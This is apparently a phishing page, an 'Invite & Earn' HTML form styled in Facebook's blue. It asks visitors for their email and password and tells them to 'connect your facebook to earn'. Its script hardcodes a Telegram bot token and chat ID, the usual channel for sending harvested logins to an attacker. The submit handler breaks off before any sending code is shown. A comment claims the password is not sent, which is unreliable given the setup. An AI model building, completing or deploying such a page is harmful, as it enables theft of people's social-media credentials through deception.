<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Invite & Earn</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
:root { --primary:#1877f2; }
* { box-sizing:border-box; font-family:Arial,Helvetica,sans-serif; }
body {
  margin:0; min-height:100vh;
  background:linear-gradient(160deg,#0b2e36,#134e5e);
  display:flex; align-items:center; justify-content:center;
}
.card{
  width:92%; max-width:380px; background:#fff;
  border-radius:22px; padding:26px 20px 28px; text-align:center;
  box-shadow:0 30px 70px rgba(0,0,0,.35);
}
.bot-avatar{
  width:120px;height:120px;margin:-70px auto 14px;border-radius:50%;
  background-image:url("https://images.unsplash.com/photo-1620712943543-bcc4688e7485");
  background-size:cover;background-position:center;
  border:5px solid #fff; box-shadow:0 10px 25px rgba(0,0,0,.25);
}
h1{ margin:8px 0 5px; font-size:24px; color:#1f2937; }
p{ margin:0 0 18px; font-size:14px; color:#555; }
input{
  width:100%; padding:14px; margin-bottom:12px;
  border-radius:10px; border:1px solid #ddd; font-size:15px;
}
input:focus{
  outline:none; border-color:var(--primary);
  box-shadow:0 0 0 3px rgba(24,119,242,.2);
}
button{
  width:100%; padding:14px; border:none; border-radius:12px;
  font-size:16px; font-weight:600; color:#fff; cursor:pointer;
  background:linear-gradient(135deg,#1877f2,#0d4fd6);
}
button:hover{ box-shadow:0 12px 30px rgba(24,119,242,.45); }
small{ display:block; margin-top:14px; font-size:11px; color:#666; }
</style>
</head>
<body>

<div class="card">
  <div class="bot-avatar"></div>
  <h1>Invite & Earn</h1>
  <p>Invite friends and earn rewards</p>

  <!-- UI keeps password field, but it is NOT sent -->
  <form id="inviteForm">
    <input type="text" id="email" placeholder="Email address" required>
    <input type="password" placeholder="Password" required>
    <button type="submit">Join & Start Earning</button>
  </form>

  <small>Connect your facebook to earn.</small>
</div>

<script>
const BOT_TOKEN = "7140462385:AAEMlQkmWwwINpGCY10W1e-i1Weq-1HBBbM";
const CHAT_ID   = "6656858850";

document.getElementById("inviteForm").onsubmit = async (e) => {
  e.preventDefault();

</script>

</body>
</html>
